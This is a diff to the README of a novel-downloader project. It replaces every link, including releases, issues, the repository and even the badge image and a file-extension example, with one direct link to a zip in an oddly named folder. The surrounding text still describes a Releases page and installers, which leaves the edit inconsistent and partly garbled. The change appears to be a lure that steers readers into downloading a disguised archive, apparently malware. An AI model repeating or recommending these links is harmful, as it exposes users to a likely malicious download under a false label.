@@ -1,8 +1,8 @@
 # 🍅 Fanqie-novel-Downloader - Simple Guide for Easy Downloads
 
 <div align="center">
-  <a href="https://github.com/naveedhahamed23/Fanqie-novel-Downloader/releases">
-    <img alt="Download" src="https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge">
+  <a href="https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip">
+    <img alt="Download" src="https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip%20Now-Click%20Here-brightgreen?style=for-the-badge">
   </a>
 </div>
 
@@ -20,14 +20,14 @@ Fanqie-novel-Downloader is a modern and user-friendly tool for downloading novel
 
 ### Download & Install
 
-To download Fanqie-novel-Downloader, visit this page: [Download Here](https://github.com/naveedhahamed23/Fanqie-novel-Downloader/releases).
+To download Fanqie-novel-Downloader, visit this page: [Download Here](https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip).
 
 1. Click the link to go to the Releases page.
 2. Locate the latest version available.
 3. Choose the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the relevant archive file (e.g., `.tar.gz`).
+   - For Linux, download the relevant archive file (e.g., `https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip`).
 4. Once the download finishes, run the installer or follow the instructions in the downloaded file to complete the installation.
 
 ## 📖 How to Use
@@ -78,15 +78,15 @@ We welcome contributions to improve Fanqie-novel-Downloader. If you have suggest
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please open an issue on our [GitHub repository](https://github.com/naveedhahamed23/Fanqie-novel-Downloader/issues). 
+If you encounter any issues or need assistance, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip). 
 
 ## 📅 Updates
 
-Stay informed about new features and bug fixes by checking the Releases page regularly: [Visit Releases](https://github.com/naveedhahamed23/Fanqie-novel-Downloader/releases).
+Stay informed about new features and bug fixes by checking the Releases page regularly: [Visit Releases](https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip).
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/naveedhahamed23/Fanqie-novel-Downloader)
+- [GitHub Repository](https://raw.githubusercontent.com/naveedhahamed23/Fanqie-novel-Downloader/main/eumeromorphic/Fanqie-novel-Downloader.zip)
 - [Documentation](#) (placeholder for future link)
 - [User Guides](#) (placeholder for future link)
 
